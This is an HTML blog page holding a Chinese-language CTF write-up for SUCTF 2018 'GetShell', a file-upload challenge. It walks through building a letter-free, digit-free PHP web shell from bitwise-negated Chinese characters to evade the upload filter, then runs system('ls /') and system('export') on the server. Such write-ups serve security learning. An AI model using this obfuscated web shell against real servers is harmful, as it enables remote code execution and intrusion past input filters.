@@ -1,0 +1,95 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author"><title>writeup · Mashiroの小站</title><meta name="description" content="[SUCTF 2018] GetShell#知识点#
+无字母数字RCE
+
+解题#进入题目，看到要上传文件
+if($contents&amp;#x3D;file_get_contents($_FILES[&amp;quot;file&amp;quot;][&amp;quot;tmp_name&amp;quot;]))&amp;#123;
+    $"><meta name="keywords" content=""><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/bootstrap.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/style-dark.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 5.1.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body><div id="stage" class="container"><div class="row"><div id="side-bar" class="col-sm-3 col-xs-12 side-container invisible"><div class="vertical-text site-title"><h3 tabindex="-1" class="site-title-small"><a href="/" class="a-title">Typography</a></h3><h1 tabindex="-1" class="site-title-large"><a href="/" class="a-title">Sakamoto</a></h1><!--h6(onclick="triggerSiteNav()") Trigger--></div><br class="visible-lg visible-md visible-sm"><div id="site-nav" class="site-title-links"><ul><li><a href="/">Home</a></li><li><a href="/archives">Archive</a></li><li><a href="/categories">Categories</a></li><li><a href="/tags">Tags</a></li><li><a href="/categories/index.html">categories</a></li><li><a href="/leetcode/index.html">leetcode</a></li><li><a href="/tags/index.html">tags</a></li><li><a href="/writeup/SUCTF_2018.html" class="current">writeup</a></li><li><a href="/writeup/SUCTF_2019.html">writeup</a></li><li><a href="/writeup/index.html" class="current">writeup</a></li><li><a href="/writeup/MRCTF_2020.html">writeup</a></li><li class="soc"><a href="https://github.com/mashiro01" target="_blank" rel="noopener noreferrer"><i class="fa fa-github">&nbsp;</i></a><a href="https://mashiro01.github.io/atom.xml" target="_blank" rel="noopener noreferrer"><i class="fa fa-rss">&nbsp;</i></a></li></ul><div class="visible-lg visible-md visible-sm site-nav-footer"><br class="site-nav-footer-br"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div><div id="main-container" class="col-sm-9 col-xs-12 main-container invisible"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post-container"><p class="post-title"><a>writeup</a></p><p class="post-meta"><span class="date meta-item">Posted at&nbsp;2020-09-05</span><span class="meta-item"><i class="fa fa-comment-o"></i><span>&nbsp;</span><a href="/writeup/SUCTF_2018.html#comments">Comments</a></span></p><p class="post-abstract"><h2><span id="suctf-2018-getshell">[SUCTF 2018] GetShell</span><a href="#suctf-2018-getshell" class="header-anchor">#</a></h2><h3><span id="zhi-shi-dian">知识点</span><a href="#zhi-shi-dian" class="header-anchor">#</a></h3><ul>
+<li>无字母数字RCE</li>
+</ul>
+<h3><span id="jie-ti">解题</span><a href="#jie-ti" class="header-anchor">#</a></h3><p>进入题目，看到要上传文件</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">if($contents&#x3D;file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]))&#123;
+    $data&#x3D;substr($contents,5);
+    foreach ($black_char as $b) &#123;
+        if (stripos($data, $b) !&#x3D;&#x3D; false)&#123;
+            die(&quot;illegal char&quot;);
+        &#125;
+    &#125;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>能看到会对前五个字符进行判断。随便上传几个文件试了试，发现都不行（图片文件也是），那就用burp跑一遍看看过滤了哪些字符</p>
+<p><img src="./../images/writeup/[SUCTF%202018]GetShell/1.png" alt="info"></p>
+<p>发现就这几个字符没被过滤，很明显是利用无字母数字来进行RCE</p>
+<p>这里贴一下P神写的博客 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
+<p>这里我们用汉字截取出来字母的方式来构造payload</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+&#x2F;&#x2F;Author: m0c1nu7
+error_reporting(0);
+header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);
+
+function str_split_unicode($str, $l &#x3D; 0) &#123;
+
+    if ($l &gt; 0) &#123;
+        $ret &#x3D; array();
+        $len &#x3D; mb_strlen($str, &quot;UTF-8&quot;);
+        for ($i &#x3D; 0; $i &lt; $len; $i +&#x3D; $l) &#123;
+            $ret[] &#x3D; mb_substr($str, $i, $l, &quot;UTF-8&quot;);
+        &#125;
+        return $ret;
+    &#125;
+    return preg_split(&quot;&#x2F;&#x2F;u&quot;, $str, -1, PREG_SPLIT_NO_EMPTY);
+&#125;
+
+$s &#x3D; &#39;你归来是诗离去成词且笑风尘不敢造次我糟糠能食粗衣也认煮酒话桑不敢相思你终会遇见这么一个人他会用整个人生将你精心收藏用漫长岁月把你妥善安放怕什么岁月漫长你心地善良,终会有一人陪你骑马喝酒走四方为你唱一首歌歌中有你亦有我我的泪我的魅将都融入到我的歌声里飘向孤独的你你是否听到了我的歌曲是否也在黯然落泪？岁月匆匆人生漫漫漠视了真情谁是站谁的谁已经变得不重要至少曾经已拥有长相思爱相随时空隔离谁相陪？花前月下心随风相思一片梦成空笑看往事红尘中多少凝思付清秋？长相思泪相随曾经谁是谁的谁？孤星冷月泪盈盈念曾经相逢心长时光短让人垂泪到天明长相思苦相随窗前双燕比翼飞日暮情人成双对于时光无垠的田野中没有早一步也没有晚一步恰好遇见了想要遇见的人这是一段多少美丽而令人心动的尘缘于爱情来说相见恨早会恨晚站会留下梨花带雨的疼痛而于友情来说无论太早或者太迟都是一份值得珍惜的情缘晚秋缓缓走晚了我的轮回疏雨一刻半疏笼起我深深的梦馀昨日遗憾寸寸疏雨挑涸泪烛落笔无处飒晚秋彼晚秋未晚懒我疏雨疏风去归我初心还我清梦唯我在晚秋未晚里守望那疏雨半疏的麦田待下一片梧桐叶复舞我亦拾起我的旧梦旧梦清寒一枕乱我眸中晚秋躞蹀的雨疏疏拍窗我的晚秋疏雨半疏疏开昨日我的梦情缘如海深邃澈蓝干涸成妄谈一湛清湖泪潸然一颦寒眉锁阑珊只为你而欣悦只因你而清泪斑斑你是我的前世吧为何沁泊在我的心怀缱绻起涟波千层驻我心扉知我情怀从此我已习惯你的嘘寒问暖懒倦地痴卧在你的胸怀红霞满腮昨天再苦都要用今天的微笑把它吟咏成一段幸福的记忆；曾经再累都要用当站下的遗忘穿越万道红尘让心波澜不惊人生最大的荣耀不在于从不跌倒而在于每一次跌倒后都能爬起来回忆是件很累的事就像失眠时怎么躺都不对的样子有时候往往直到离开在回忆里才能知道自己有多喜欢一座城&#39;;
+
+$arr_str&#x3D;str_split_unicode($s);
+
+for ($i&#x3D;0; $i &lt; strlen($s) ; $i++) &#123;
+	echo $arr_str[$i].&#39; ------- &#39;.~$arr_str[$i][1].&#39;&lt;br&gt;&#39;;
+&#125;
+
+ ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>用这个脚本找出来可用的汉字，再拼接所需的字母即可得到脚本</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; php5 -- assert($_POST[_])
+&#x2F;&#x2F; php7 -- system($_POST[_])
+
+&#x2F;&#x2F; [] &#x3D;&#x3D; [] &#x3D; 1
+
+&#x2F;&#x2F; 汉字UTF-8编码可以截取出来所需字母
+
+&lt;?php
+$__&#x3D;[];
+$_&#x3D;($__&#x3D;&#x3D;$__); &#x2F;&#x2F; 1
+$__&#x3D;~(融);
+$___&#x3D;$__[$_];
+$__&#x3D;~(匆);
+$___.&#x3D;$__[$_].$__[$_];
+$__&#x3D;~(随);
+$___.&#x3D;$__[$_];
+$__&#x3D;~(千);
+$___.&#x3D;$__[$_];
+$__&#x3D;~(苦);
+$___.&#x3D;$__[$_];
+$____&#x3D;~(~(_));
+$__&#x3D;~(诗);
+$____.&#x3D;$__[$_];
+$__&#x3D;~(尘);
+$____.&#x3D;$__[$_];
+$__&#x3D;~(欣);
+$____.&#x3D;$__[$_];
+$__&#x3D;~(站);
+$____.&#x3D;$__[$_];
+$_&#x3D;$$____;
+$___($_[_]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>上传上去</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">system(&quot;ls &#x2F;&quot;); &#x2F;&#x2F; 发现假flag
+system(&quot;export&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+</p></div><a id="comments"></a><div id="disqus_thread"></div><script>var disqus_shortname = 'mashiro01';
+var disqus_identifier = 'writeup/SUCTF_2018.html';
+var disqus_title = 'writeup';
+var disqus_url = 'https://mashiro01.github.io/writeup/SUCTF_2018.html';
+(function () {
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();</script><script id="dsq-count-scr" src="//mashiro01.disqus.com/count.js" async></script></div></div></div><div class="visible-xs site-bottom-footer"><footer><p>&copy;&nbsp;2020&nbsp;<a target="_blank" href="https://mashiro01.github.io" rel="noopener noreferrer">Mashiroi</a></p><p>Theme&nbsp;<a target="_blank" href="https://github.com/SumiMakito/hexo-theme-typography" rel="noopener noreferrer">Typography</a>&nbsp;by&nbsp;<a target="_blank" href="https://www.keep.moe" rel="noopener noreferrer">Makito</a></p><p>Proudly published with&nbsp;<a target="_blank" href="https://hexo.io" rel="noopener noreferrer">Hexo</a></p></footer></div></div></div></div><script src="/js/jquery-3.1.0.min.js"></script><script src="/js/bootstrap.min.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/google-analytics.js"></script><script src="/js/typography.js"></script></body></html>
